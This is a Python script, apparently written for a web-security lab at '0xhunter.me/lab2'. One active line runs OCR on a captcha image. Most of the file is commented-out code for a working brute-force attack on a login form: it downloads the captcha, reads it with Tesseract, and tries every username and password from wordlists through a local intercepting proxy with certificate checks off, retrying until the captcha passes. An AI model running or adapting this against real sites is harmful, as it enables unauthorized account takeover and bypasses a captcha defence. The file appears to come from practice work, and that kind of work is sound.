from PIL import Image
import pytesseract
# import requests
# import urllib3

# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# # Function to perform OCR
def perform_ocr(image_path):
    # Open the image file
    img = Image.open(image_path)

    # Perform OCR on the image
    text = pytesseract.image_to_string(img, lang='eng')

    return text

print(perform_ocr("downloaded_file.jpg"))
# url = "https://0xhunter.me/lab2/"

# session = requests.Session()

# session.headers.update({
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
# })
# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# def download_file(url, filename):
#     # Send a GET request to the URL
#     response = session.get(url, stream=True)

#     # Check if the request was successful
#     if response.status_code == 200:
#         # Open a file with the specified filename in binary write mode
#         with open(filename, 'wb') as file:
#             # Write the content of the response to the file
#             for chunk in response.iter_content(chunk_size=128):
#                 file.write(chunk)
#         print(f"File downloaded: {filename}")
#     else:
#         print(f"Failed to download file. Status code: {response.status_code}")

# # Example usage
# url_captch = url+"captcha.php"
# filename = 'downloaded_file.jpg'  # Replace with your desired filename and extension




# # Example usage


# start_line = int(input("start line:"))  # Start from line 10 (inclusive)
# end_line = int(input("end line:"))    # End at line 50 (exclusive)


# with open('usernames.txt', 'r') as file:
#     usernames = file.read().splitlines()[start_line:end_line]

# with open('passwords.txt', 'r') as file:
#     passwords = file.read().splitlines()


# def attempt(username,password):
#     try:
#         download_file(url_captch, filename)

#         image_path = filename
#         extracted_text = perform_ocr(image_path)
#         print(extracted_text)
#         data = {
#                 'username': username.strip(),
#                 'password': password.strip(),
#                 'captcha' : extracted_text
#             }
#         response = session.post(url, data=data,proxies=proxies,verify=False)
#         return response.text
#     except:
#         attempt(username,password)


# for username in usernames:
#     for password in passwords:
#         output = attempt(username,password)
#         # Perform the POST request
#         while("Captcha is incorrect" in output):
#             output = attempt(username,password)

#         # Check if login was successful
#         if "Username or password incorrect" not in output:
#             print(f"Success with {username}:{password}")
#             break
#         else:
#             print(f"Failed with {username}:{password}")
